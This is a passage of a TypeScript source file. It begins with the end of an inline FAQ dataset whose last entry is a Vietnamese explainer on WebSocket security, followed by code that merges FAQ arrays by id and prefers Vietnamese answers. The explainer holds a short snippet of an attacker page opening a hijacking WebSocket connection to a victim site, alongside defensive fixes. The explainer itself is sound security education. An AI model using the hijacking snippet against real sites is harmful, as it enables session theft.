    "answer": "## WebSocket Security\n\nWebSocket giao tiếp hai chiều real-time nhưng có rủi ro bảo mật riêng.\n\n**Lỗ hổng thường gặp:**\n\n**1. Cross-Site WebSocket Hijacking (CSWSH):**\n```javascript\n// Attacker tạo trang độc hại:\nconst ws = new WebSocket('wss://victim-site.com/ws');\n// Browser tự gửi cookie session → server accept\n```\nFix: Validate Origin header và dùng CSRF token trong handshake.\n\n**2. Thiếu authentication trên WebSocket:**\n```\nHTTP login → session cookie OK\nNhưng /ws endpoint không verify session\n→ Attacker kết nối trực tiếp không cần auth\n```\n\n**3. Thiếu input validation:**\nDữ liệu qua WebSocket cũng phải validate — có thể inject SQL, XSS nếu không sanitize.\n\n**4. Dùng ws:// thay wss://** (không có TLS):\nData bị nghe lén (man-in-the-middle).\n\n**Best practices:**\n- Luôn dùng wss:// (WebSocket Secure)\n- Validate Origin header khi upgrade connection\n- Authenticate ngay sau connect (gửi token trong message đầu)\n- Rate limit messages để tránh DoS\n\n**OWASP**: A07 — Auth Failures, A03 — Injection"
  }
];

type RawFaqEntry = {
  id: string;
  keywords: string[];
  question: string;
  answer: string;
  tags?: string[];
};

function isVietnamese(s: string): boolean {
  // Nhận diện dấu tiếng Việt (à-ỹ) để ưu tiên câu trả lời tiếng Việt thay vì tiếng Anh.
  return /[à-ỹ]/i.test(s) || /Cách\s|Nhấn\s|Ví dụ\s|Hỏi\s/i.test(s);
}

function mergeFaqArrays(...arrays: RawFaqEntry[][]): RawFaqEntry[] {
  const byId = new Map<string, RawFaqEntry>();

  for (const arr of arrays) {
    for (const entry of arr) {
      const id = entry?.id;
      if (!id) continue;

      const current = byId.get(id);
      if (!current) {
        byId.set(id, { ...entry, keywords: [...(entry.keywords || [])] });
        continue;
      }

      const nextKeywords = new Set<string>([
        ...(current.keywords || []),
        ...(entry.keywords || []),
      ]);

      const preferEntry = isVietnamese(entry.answer) && !isVietnamese(current.answer);
      const chosenAnswer = preferEntry ? entry.answer : current.answer;
      const chosenQuestion = preferEntry ? entry.question : current.question;

      byId.set(id, {
        ...current,
        answer: chosenAnswer,
        question: chosenQuestion,
        keywords: [...nextKeywords],
      });
    }
  }

  return Array.from(byId.values());
}

export const INLINE_FAQ_DATA = mergeFaqArrays(
  INLINE_FAQ_DATA_EN as RawFaqEntry[],
  INLINE_FAQ_DATA_DUP_1 as RawFaqEntry[],
  INLINE_FAQ_DATA_DUP_2 as RawFaqEntry[],
  INLINE_FAQ_DATA_DUP_3 as RawFaqEntry[],
  INLINE_FAQ_DATA_DUP_4 as RawFaqEntry[],
);
